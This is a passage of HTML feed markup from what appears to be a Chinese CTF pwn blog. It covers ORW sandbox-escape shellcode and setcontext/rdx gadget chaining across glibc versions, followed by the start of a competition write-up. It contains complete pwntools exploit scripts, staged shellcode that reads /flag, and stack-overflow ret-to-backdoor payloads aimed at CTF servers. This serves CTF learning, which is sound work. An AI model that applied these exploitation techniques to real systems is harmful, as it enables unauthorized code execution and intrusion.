class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">payload1 = asm(shellcode)</span><br><span class="line"></span><br><span class="line">//或</span><br><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66 </span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,eax                   </span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">sub rsi,50</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor edi,2#mov dil,1</span></span><br><span class="line"><span class="string">mov eax,edi#mov al,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)                                      //即调用<span class="built_in">open</span>、read、write函数</span><br><span class="line"></span><br><span class="line">shellcode1 = shellcode1.ljust(offset,<span class="string">b&#x27;\x00&#x27;</span>) //offset = 距离rbp偏移 </span><br><span class="line"></span><br><span class="line">shellcoe2 = asm(<span class="string">&#x27;sub rsp,0x30;call rsp&#x27;</span>)      //控制执行流回到初始地方执行shellcode</span><br><span class="line"></span><br><span class="line">payload = shellcode1 + p64(jmp rsp_addr) + shellcode2</span><br></pre></td></tr></table></figure><p><strong>文件标识符中0、1、2是默认打开的接下来打开的会按照3、4、5……这样排列</strong></p><h2 id="3、思路"><a href="#3、思路" class="headerlink" title="3、思路"></a>3、思路</h2><h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰了，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+<span class="number">53</span>&gt;:  mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">60</span>&gt;:  mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line">&lt;setcontext+<span class="number">67</span>&gt;:  mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line">&lt;setcontext+<span class="number">71</span>&gt;:  mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">&lt;setcontext+<span class="number">75</span>&gt;:  mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line">&lt;setcontext+<span class="number">79</span>&gt;:  mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line">&lt;setcontext+<span class="number">83</span>&gt;:  mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br><span class="line">&lt;setcontext+<span class="number">87</span>&gt;:  mov    rcx,QWORD PTR [rdi+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">94</span>&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+<span class="number">95</span>&gt;:  mov    rsi,QWORD PTR [rdi+<span class="number">0x70</span>]</span><br><span class="line">&lt;setcontext+<span class="number">99</span>&gt;:  mov    rdx,QWORD PTR [rdi+<span class="number">0x88</span>]</span><br><span class="line">&lt;setcontext+<span class="number">106</span>&gt;: mov    rcx,QWORD PTR [rdi+<span class="number">0x98</span>]</span><br><span class="line">&lt;setcontext+<span class="number">113</span>&gt;: mov    r8,QWORD PTR [rdi+<span class="number">0x28</span>]</span><br><span class="line">&lt;setcontext+<span class="number">117</span>&gt;: mov    r9,QWORD PTR [rdi+<span class="number">0x30</span>]</span><br><span class="line">&lt;setcontext+<span class="number">121</span>&gt;: mov    rdi,QWORD PTR [rdi+<span class="number">0x68</span>]</span><br><span class="line">&lt;setcontext+<span class="number">125</span>&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+<span class="number">127</span>&gt;: ret</span><br></pre></td></tr></table></figure><p>一般是通过<code>free_hook</code>由于free的时候rdi是可控的，那么就可以在free_hook上放置setcontext的指针，再free的时候就会把可控区域的值填充到寄存器中，从而获得更强大的控制流</p><h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>但在 <code>Glibc 2.29</code>之后 <code>setcontext</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000580</span>DD                 mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">00000000000580E4</span>                 mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">00000000000580</span>EB                 mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">00000000000580</span>EF                 mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>3                 mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>7                 mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>B                 mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>F                 test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">    ....</span><br><span class="line">.text:<span class="number">00000000000581</span>C6                 mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">00000000000581</span>CD                 push    rcx</span><br><span class="line">.text:<span class="number">00000000000581</span>CE                 mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>D2                 mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>D6                 mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>DD                 mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">00000000000581E1</span>                 mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">00000000000581E5</span>                 mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>EC                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000581</span>EE                 retn</span><br></pre></td></tr></table></figure><p>但是我们很难找到能够直接控制rdx寄存器的gadgets</p><p>但是在 <code>getkeyserv_handle+576</code>，其汇编如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, [rdi+8]</span><br><span class="line">mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure><p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29到2.32都可用</p><p>控制 <code>rdx</code>之后，我们就可以通过 <code>setcontext</code>来控制其他寄存器了</p><p> 附上本人亲自手绘plus版本的图</p><table><thead><tr><th>地址</th><th>值</th><th>地址</th><th>值</th></tr></thead><tbody><tr><td>rdi</td><td></td><td>rdi+8h</td><td>RDX</td></tr><tr><td>rdi+10h</td><td></td><td>rdi+18h</td><td></td></tr><tr><td>rdi+20h</td><td></td><td>rdi+28h</td><td></td></tr></tbody></table><p>前后两张图，大部分时候是会重叠的，取决于可控制区域的大小呢</p><table><thead><tr><th>地址</th><th>值</th><th>地址</th><th>值</th></tr></thead><tbody><tr><td>rdx</td><td></td><td>rdx+8h</td><td></td></tr><tr><td>rdx+10h</td><td></td><td>rdx+18h</td><td></td></tr><tr><td>rdx+20h</td><td>setcontext的指针</td><td>rdx+28h</td><td>R8</td></tr><tr><td>rdx+30h</td><td>R9</td><td>rdx+38h</td><td></td></tr><tr><td>rdx+40h</td><td></td><td>rdx+48h</td><td>R12</td></tr><tr><td>rdx+50h</td><td>R13</td><td>rdx+58h</td><td>R14</td></tr><tr><td>rdx+60h</td><td>R15</td><td>rdx+68h</td><td>RDI</td></tr><tr><td>rdx+70h</td><td>RSI</td><td>rdx+78h</td><td>RBP</td></tr><tr><td>rdx+80h</td><td>RBX</td><td>rdx+88h</td><td>RDX</td></tr><tr><td>rdx+90h</td><td></td><td>rdx+98h</td><td>RCX</td></tr><tr><td>rdx+a0h</td><td>RSP</td><td>rdx+a8h</td><td>RCX</td></tr><tr><td>rdx+b0h</td><td></td><td>rdx+b8h</td><td></td></tr></tbody></table><p><strong>这里附上学到的程序写法：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span>: gdb.attach(p)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br></pre></td></tr></table></figure><p><strong>这些是定义一个函数，然后lambda后面的是参数，看着挺好用的，第一次学会</strong></p><h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2><p>这种<code>shellcode</code>题目除了掌握基本的<code>orw_shellcode</code>外，要时刻关注执行<code>shellcode</code>前后的寄存器变化，根据寄存器写<code>shellcode</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211833.png" alt="image-20240313210417540"></p><ul><li>首先<code>shellcode</code>有<code>16</code>个字节大小的限制，这也就意味着接下来我们要用<code>16</code>个字节大小限制的<code>shellcode</code>扩大漏洞利用能力。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211834.png" alt="img"></p><ul><li>调试并根据寄存器编写一下<code>shellcode</code>，目标是写入更多数据到<code>0xcafe0000</code>这片空间并执行：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode1=asm(&#x27;&#x27;&#x27;</span><br><span class="line">    mov rdi,rax</span><br><span class="line">    mov rsi,rdx</span><br><span class="line">    mov edx,0x100</span><br><span class="line">    syscall</span><br><span class="line">    call rsi</span><br><span class="line">    nop</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">print(len(shellcode1))</span><br></pre></td></tr></table></figure><ul><li>而后就是编写常规的<code>orw</code>的<code>shellcode</code>，注意开头需要多写一些<code>nop</code>，否则写出的就不是目标<code>flag</code>，猜测是控制相关问题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66        ##flag##</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>总的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31266</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28371</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;konsole&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span>: gdb.attach(p)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    xor edi,edi</span></span><br><span class="line"><span class="string">    mov edx,0x1000</span></span><br><span class="line"><span class="string">    mov esi,0xcafe0000</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)    <span class="comment">#这里是调用read函数</span></span><br><span class="line">sa(<span class="string">&quot;Please input your shellcode:&quot;</span>,shellcode)</span><br><span class="line">shellcode = <span class="string">b&quot;\x90&quot;</span> * <span class="number">0x100</span>  <span class="comment">#这里的&#x27;\x90&#x27;是nop,数据改掉后滑到shellcode的地方开始执行</span></span><br><span class="line">shellcode += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0100</span>,<span class="number">0x100</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0100</span>,<span class="number">0x100</span>))</span><br><span class="line">s(shellcode)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.anquanke.com/post/id/236832#h3-8">PWN堆溢出技巧：ORW的解题手法与万金油Gadgets-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://xie-yuanhao.gitee.io/2023/07/11/Pwn-%E6%B5%85%E8%B0%88ORW%E5%88%A9%E7%94%A8/">Pwn-浅谈orw利用 | 此间的少年 (gitee.io)</a></p><p><a href="https://www.cnblogs.com/fuxuqiannian/p/17144953.html#">orw入门报告 - ㅤ浮虚千年 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;沙盒&quot;&gt;&lt;a href=&quot;#沙盒&quot; class=&quot;headerlink&quot; title=&quot;沙盒&quot;&gt;&lt;/a&gt;沙盒&lt;/h1&gt;&lt;h2 id=&quot;什么是orw？&quot;&gt;&lt;a href=&quot;#什么是orw？&quot; class=&quot;headerlink&quot; title=&quot;什么是orw？&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="2024ROIS冬令营" scheme="http://s1nec-1o.github.io/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024rois-wp</title>
    <link href="http://s1nec-1o.github.io/2024/01/17/2024rois-wp/"/>
    <id>http://s1nec-1o.github.io/2024/01/17/2024rois-wp/</id>
    <published>2024-01-17T08:07:54.000Z</published>
    <updated>2024-04-28T14:15:21.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="tryc"><a href="#tryc" class="headerlink" title="tryc"></a>tryc</h2><p>很简单的 运行getshell</p><h2 id="easy-backdoor"><a href="#easy-backdoor" class="headerlink" title="easy_backdoor"></a>easy_backdoor</h2><p>很简单的栈溢出</p><p>程序中明显栈溢出漏洞</p><p>直接溢出到ret</p><p>然后程序中有个后门</p><p>就直接getshell</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214756.png" alt="image-20240127213737253"></p><p>有个踩雷点就是要得返回这个地址</p><p>不然堆栈会出错就嘎嘎报错，别问我怎么知道的&#x2F;(ㄒoㄒ)&#x2F;~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=remote(<span class="string">&#x27;114.116.233.171&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">payload=<span class="number">0x20</span> * <span class="string">b&#x27;A&#x27;</span>+p64(<span class="number">0</span>) + p64(<span class="number">0x0004011F8</span>)  <span class="comment">##没开保护直接绝对地址</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214757.png" alt="image-20240127214337242"></p><h2 id="backdoor2"><a href="#backdoor2" class="headerlink" title="backdoor2"></a>backdoor2</h2><p>这道题也是栈溢出，但是很难看出来</p><p>调试就很好看出来</p><p>脑洞很大</p><p>依靠的是</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214758.png" alt="image-20240127214604500"></p><p>溢出这个.com</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214759.png" alt="image-20240127214941320"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214760.png" alt="image-20240127214954283"></p><p>然后有溢出思路，因为溢出空间是足够的，所以可以算出刚刚好溢出到ret上是win地址(也可以试出来)</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214761.png" alt="image-20240127215423995"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">&#x27;114.116.233.171&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line">payload=<span class="number">0x38</span> * <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214762.png" alt="image-20240127215635936"></p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这道题思路并不难，只是难构造</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214763.png" alt="image-20240127215747235"></p><p>看程序一个注意canary以及栈可执行 之后要用到</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214764.png" alt="image-20240127215851272"></p><p>看主程序有个sandbox说明是沙盒检查一下</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282214765.png" 